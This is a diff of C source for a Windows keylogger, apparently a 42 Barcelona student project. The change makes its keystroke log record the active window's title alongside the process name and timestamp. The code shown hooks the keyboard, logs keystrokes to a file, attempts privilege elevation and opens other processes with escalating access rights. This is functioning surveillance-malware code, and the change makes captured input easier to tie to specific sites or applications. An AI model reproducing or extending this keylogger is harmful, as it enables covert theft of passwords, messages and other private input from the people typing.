@@ -5,8 +5,8 @@
 /*                                                    +:+ +:+         +:+     */
 /*   By: cescanue <cescanue@student.42barcelona.    +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
-/*   Created: 2024/10/09 20:59:05 by cescanue          #+#    #+#             */
-/*   Updated: 2024/10/09 20:59:06 by cescanue         ###   ########.fr       */
+/*   Created: 2024/10/09 20:59:29 by cescanue          #+#    #+#             */
+/*   Updated: 2024/10/17 21:55:38 by cescanue         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -28,6 +28,7 @@
 #define MAX_PATH_LEN 260
 
 wchar_t lastProcessName[MAX_PATH_LEN] = L"";
+wchar_t lastWindowTitle[MAX_PATH_LEN] = L""; // NUEVO: Para almacenar el último título de la ventana
 HWND lastForegroundWindow = NULL;
 wchar_t basePath[MAX_PATH_LEN] = L"";  // Ruta base del ejecutable
 wchar_t logPath[MAX_PATH_LEN] = L"";  // Ruta del archivo de log, cargada al inicio
@@ -115,52 +116,54 @@ void elevatePrivileges() {
     }
 }
 
-// Función para registrar el nombre del proceso activo
-void logProcessName(FILE* file) {
+// Función para registrar el nombre del proceso activo y el título de la ventana activa
+void logProcessAndWindowInfo(FILE* file) {
     HWND foregroundWindow = GetForegroundWindow();
     if (foregroundWindow == NULL) {
         fwprintf(file, L"[Unknown Process]");
         return;
     }
 
-    if (foregroundWindow != lastForegroundWindow) {
+    DWORD processId;
+    GetWindowThreadProcessId(foregroundWindow, &processId);
+
+    HANDLE processHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processId);
+    if (processHandle == NULL) {
+        processHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, processId);
+    }
+    if (processHandle == NULL) {
+        processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
+    }
+
+    wchar_t processName[MAX_PATH_LEN] = L"Unknown Process";
+    if (processHandle != NULL) {
+        if (GetModuleBaseNameW(processHandle, NULL, processName, MAX_PATH_LEN) == 0) {
+            if (GetProcessImageFileNameW(processHandle, processName, MAX_PATH_LEN) == 0) {
+                wcscpy_s(processName, MAX_PATH_LEN, L"Unknown Process");
+            }
+        }
+        CloseHandle(processHandle);
+    }
+
+    wchar_t windowTitle[MAX_PATH_LEN];
+    GetWindowTextW(foregroundWindow, windowTitle, MAX_PATH_LEN);
+
+    // Se añade una condición para verificar si el título de la ventana ha cambiado o si es un nuevo proceso
+    if (wcscmp(lastProcessName, processName) != 0 || lastForegroundWindow != foregroundWindow || wcscmp(lastWindowTitle, windowTitle) != 0) {
+        wcscpy_s(lastProcessName, MAX_PATH_LEN, processName);
+        wcscpy_s(lastWindowTitle, MAX_PATH_LEN, windowTitle);  // Actualiza el último título de la ventana
         lastForegroundWindow = foregroundWindow;
 
-        DWORD processId;
-        GetWindowThreadProcessId(foregroundWindow, &processId);
-
-        HANDLE processHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processId);
-        if (processHandle == NULL) {
-            processHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, processId);
-        }
-        if (processHandle == NULL) {
-            processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
-        }
-
-        wchar_t processName[MAX_PATH_LEN] = L"Unknown Process";
-        if (processHandle != NULL) {
-            if (GetModuleBaseNameW(processHandle, NULL, processName, MAX_PATH_LEN) == 0) {
-                if (GetProcessImageFileNameW(processHandle, processName, MAX_PATH_LEN) == 0) {
-                    wcscpy_s(processName, MAX_PATH_LEN, L"Unknown Process");
-                }
-            }
-            CloseHandle(processHandle);
-        }
-
-        if (wcscmp(lastProcessName, processName) != 0) {
-            wcscpy_s(lastProcessName, MAX_PATH_LEN, processName);
-
-            time_t now = time(NULL);
-            struct tm* localTime = localtime(&now);
-            fwprintf(file, L"\n[%04d-%02d-%02d %02d:%02d:%02d] [%ls]\n",
-                     localTime->tm_year + 1900,
-                     localTime->tm_mon + 1,
-                     localTime->tm_mday,
-                     localTime->tm_hour,
-                     localTime->tm_min,
-                     localTime->tm_sec,
-                     processName);
-        }
+        time_t now = time(NULL);
+        struct tm* localTime = localtime(&now);
+        fwprintf(file, L"\n[%04d-%02d-%02d %02d:%02d:%02d] [%ls] - Active Window: [%ls]\n",
+                 localTime->tm_year + 1900,
+                 localTime->tm_mon + 1,
+                 localTime->tm_mday,
+                 localTime->tm_hour,
+                 localTime->tm_min,
+                 localTime->tm_sec,
+                 processName, windowTitle);
     }
 }
 
@@ -240,7 +243,7 @@ void logKeystroke(int key) {
         return;
     }
 
-    logProcessName(file);  // Registrar el nombre del proceso si cambió
+    logProcessAndWindowInfo(file);  // Registrar el nombre del proceso y ventana si cambió
     logModifiers(file);  // Registrar las teclas modificadoras presionadas
 
     if ((key >= 0x30 && key <= 0x5A) || (key >= 0x60 && key <= 0x7A)) {
@@ -266,7 +269,7 @@ LRESULT CALLBACK KeyboardHook(int nCode, WPARAM wParam, LPARAM lParam) {
 void logActiveProcessOnWindowChange() {
     FILE* file = _wfopen(logPath, L"a+");
     if (file != NULL) {
-        logProcessName(file);  // Registrar el proceso activo en el archivo de log
+        logProcessAndWindowInfo(file);  // Registrar el proceso y ventana activa en el archivo de log
         fclose(file);
     }
 }
